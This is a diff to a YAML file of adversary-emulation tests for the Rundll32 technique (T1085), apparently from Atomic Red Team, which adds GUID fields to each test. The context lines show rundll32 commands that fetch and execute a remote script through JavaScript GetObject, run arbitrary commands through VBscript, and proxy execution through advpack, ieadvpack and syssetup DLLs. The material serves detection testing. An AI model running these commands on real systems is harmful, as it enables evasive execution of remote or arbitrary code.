@@ -3,6 +3,7 @@ attack_technique: T1085
 display_name: Rundll32
 atomic_tests:
 - name: Rundll32 execute JavaScript Remote Payload With GetObject
+  auto_generated_guid: c2a53fe0-7495-448c-93cd-46bc6115b795
   description: |
     Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.
   supported_platforms:
@@ -19,6 +20,7 @@ atomic_tests:
       rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
 
 - name: Rundll32 execute VBscript command
+  auto_generated_guid: 12d622e5-6e35-4afa-a47e-2c9d6fa495e1
   description: |
     Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
     Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
@@ -37,6 +39,7 @@ atomic_tests:
       rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
 
 - name: Rundll32 advpack.dll Execution
+  auto_generated_guid: fdc3b0ee-387d-40c4-830e-37bb24f2250a
   description: |
     Test execution of a command using rundll32.exe with advpack.dll.
     Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
@@ -66,6 +69,7 @@ atomic_tests:
       rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
 - name: Rundll32 ieadvpack.dll Execution
+  auto_generated_guid: e6556a3f-5bcf-4982-8cf6-4f8b896c026d
   description: |
     Test execution of a command using rundll32.exe with ieadvpack.dll.
     Upon execution calc.exe will be launched
@@ -96,6 +100,7 @@ atomic_tests:
       rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
 - name: Rundll32 syssetup.dll Execution
+  auto_generated_guid: 551458cf-7d0b-4f2a-a70d-a1893ee88df8
   description: |
     Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened
 
@@ -125,6 +130,7 @@ atomic_tests:
       rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}
 
 - name: Rundll32 setupapi.dll Execution
+  auto_generated_guid: 1f10eac1-f60d-4f2c-acde-0b0b676a7ac6
   description: |
     Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened
 
